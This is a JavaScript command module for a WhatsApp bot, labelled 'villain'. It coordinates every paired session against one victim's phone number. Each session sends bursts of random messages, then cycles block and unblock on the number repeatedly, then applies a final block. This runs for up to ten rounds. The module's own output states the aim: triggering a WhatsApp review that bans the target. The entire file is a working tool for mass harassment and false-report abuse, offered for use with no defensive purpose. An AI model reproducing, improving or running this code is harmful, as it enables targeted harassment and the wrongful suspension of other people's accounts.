const fs   = require("node:fs");
const path = require("node:path");

const STATE_FILE = path.join(process.cwd(), "data", "massreport_state.json");
const activeJobs = new Map(); // targetJid → { cancel: bool }

// ─── State helpers ────────────────────────────────────────────────
function loadState() {
    try {
        if (!fs.existsSync(STATE_FILE)) return {};
        return JSON.parse(fs.readFileSync(STATE_FILE, "utf8"));
    } catch { return {}; }
}

function saveState(state) {
    const dir = path.dirname(STATE_FILE);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(STATE_FILE, JSON.stringify(state, null, 2));
}

// ─── Helpers ──────────────────────────────────────────────────────
const NOISE = [
    ".", "..", "ok", "hi", "hey", "yo", "sup", "k",
    "hm", "lol", "wut", "bruh", "wtf", "ugh", "smh",
    "???", "!!!", "nah", "yep", "no"
];

function noise() {
    return NOISE[Math.floor(Math.random() * NOISE.length)];
}

function delay(min, max) {
    const ms = Math.floor(Math.random() * (max - min + 1)) + min;
    return new Promise(r => setTimeout(r, ms));
}

// ─── Pressure per session ─────────────────────────────────────────
async function applyPressure(sock, targetJid, label, job) {
    const results = [];

    try {
        // Vector 1 — randomized message burst
        for (let i = 0; i < 10; i++) {
            if (job.cancel) break;
            await sock.sendMessage(targetJid, { text: noise() });
            await delay(400, 900);
        }
        results.push(`✅ [${label}] Burst done`);

        if (job.cancel) return results;

        // Vector 2 — block / unblock cycle
        for (let i = 0; i < 8; i++) {
            if (job.cancel) break;
            await sock.updateBlockStatus(targetJid, "block");
            await delay(600, 1200);
            await sock.updateBlockStatus(targetJid, "unblock");
            await delay(600, 1200);
        }
        results.push(`✅ [${label}] Block cycle done`);

        if (job.cancel) return results;

        // Vector 3 — final block
        await sock.updateBlockStatus(targetJid, "block");
        results.push(`✅ [${label}] Final block applied`);

    } catch (err) {
        results.push(`❌ [${label}] ${err.message}`);
    }

    return results;
}

// ─── Coordinated multi-session fire ──────────────────────────────
async function fireAllSessions(targetJid, job) {
    // Primary bot's core Baileys socket
    const primarySock = global.moonsonClient?.core;
    if (!primarySock) throw new Error("Primary client not ready");

    // Extra paired sessions
    const extraSocks = global.getActiveSessions?.() ?? [];

    const sessions = [
        { sock: primarySock, label: "PRIMARY" },
        ...extraSocks.map((s, i) => ({ sock: s, label: `SESSION_${i + 1}` }))
    ];

    // Fire all simultaneously
    const results = await Promise.all(
        sessions.map(({ sock, label }) => applyPressure(sock, targetJid, label, job))
    );

    return sessions.map(({ label }, i) => ({ label, results: results[i] }));
}

// ─── Command ──────────────────────────────────────────────────────
module.exports = {
    name: "massreport",
    category: "villain",
    aliases: ["mreport", "banfire", "stopreport"],
    permissions: { owner: true },

    code: async (ctx) => {
        const { command, args } = ctx;

        // ── Owner gate via Moonson's built-in checker ──
        const primary = global.moonsonClient;
        if (!primary) return ctx.reply("❌ Primary client not ready.");

        const isOwner = primary.checkOwner(ctx.sender?.jid, ctx.m?.key?.fromMe);
        if (!isOwner) return;

        // ── .stopreport <number> ──────────────────────────────────
        if (command === "stopreport") {
            const num = args[0]?.replace(/\D/g, "");
            if (!num) return ctx.reply("Usage: .stopreport <number>");

            const targetJid = `${num}@s.whatsapp.net`;
            if (!activeJobs.has(targetJid)) {
                return ctx.reply(`⚠️ No active job for ${num}`);
            }

            activeJobs.get(targetJid).cancel = true;
            activeJobs.delete(targetJid);
            return ctx.reply(`🛑 Job cancelled for ${num}`);
        }

        // ── .massreport / .mreport / .banfire <number> [rounds] ──
        const num = args[0]?.replace(/\D/g, "");
        if (!num || num.length < 7 || num.length > 15) {
            return ctx.reply(
                `*Mass Reporter — Usage*\n\n`
                + `.massreport <number> [rounds]\n`
                + `.stopreport <number>\n\n`
                + `rounds = pressure waves, max 10 (default: 1)\n\n`
                + `Example: .massreport 62812345678 3`
            );
        }

        const rounds    = Math.min(parseInt(args[1]) || 1, 10);
        const targetJid = `${num}@s.whatsapp.net`;

        if (activeJobs.has(targetJid)) {
            return ctx.reply(
                `⚠️ Job already running on ${num}.\n`
                + `Use .stopreport ${num} to cancel.`
            );
        }

        const job          = { cancel: false };
        const sessionCount = 1 + (global.getSessionCount?.() ?? 0);

        activeJobs.set(targetJid, job);

        await ctx.reply(
            `🔥 *MASS REPORT INITIATED*\n\n`
            + `Target  : ${num}\n`
            + `Sessions: ${sessionCount}\n`
            + `Rounds  : ${rounds}\n\n`
            + `Use .stopreport ${num} to abort.`
        );

        const state = loadState();
        state[num] = {
            startedAt: new Date().toISOString(),
            rounds,
            sessions: sessionCount,
            log: []
        };

        // ── Round loop ────────────────────────────────────────────
        for (let r = 1; r <= rounds; r++) {
            if (job.cancel) break;

            await ctx.reply(`⚡ Round ${r}/${rounds} firing...`);

            let roundResults;
            try {
                roundResults = await fireAllSessions(targetJid, job);
            } catch (err) {
                await ctx.reply(`❌ Round ${r} failed: ${err.message}`);
                break;
            }

            const summary = roundResults
                .map(({ label, results }) => `*${label}*\n` + results.join("\n"))
                .join("\n\n");

            state[num].log.push({ round: r, results: roundResults });
            saveState(state);

            await ctx.reply(`📊 *Round ${r} Complete*\n\n${summary}`);

            if (r < rounds && !job.cancel) await delay(3000, 6000);
        }

        activeJobs.delete(targetJid);

        if (!job.cancel) {
            await ctx.reply(
                `✅ *Job Complete — ${num}*\n\n`
                + `${rounds} round(s) × ${sessionCount} session(s) fired.\n`
                + `⏳ WA review triggers within 24–48h under sustained pressure.`
            );
        }
    }
};